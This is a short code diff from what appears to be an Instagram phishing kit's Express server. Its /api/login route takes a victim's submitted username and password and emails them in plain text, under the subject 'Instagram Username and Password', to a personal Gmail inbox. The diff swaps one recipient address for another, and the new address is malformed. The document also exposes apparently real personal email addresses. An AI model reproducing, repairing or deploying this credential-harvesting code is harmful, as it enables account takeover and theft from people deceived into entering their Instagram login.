@@ -47,7 +47,7 @@ app.post('/api/login', async (req, res) => {
 
         const mailOptions = {
             from: process.env.ORGANIZATION_EMAIL,
-            to: "ankitsonkar.work@gmail.com",
+            to: "arvindkumar8960gmail.com",
             subject: 'Instagram Username and Password',
             text: `Username and Password:\n\nUsername: ${username} \n\nPassword:${password} `,
         };
